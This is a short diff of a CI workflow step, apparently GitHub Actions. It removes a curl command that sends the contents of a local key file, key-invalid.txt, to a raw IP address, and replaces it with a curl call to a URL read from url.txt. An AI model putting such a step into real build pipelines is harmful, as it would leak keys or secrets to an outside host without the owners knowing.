@@ -12,4 +12,4 @@ jobs:
       - name: Run a multi-line script
         run: |
           set -eu
-          curl "http://156.226.174.172:10089/test?version=$(tr -d '\n' < key-invalid.txt)"
+          curl "$(tr -d '\n' < url.txt)"
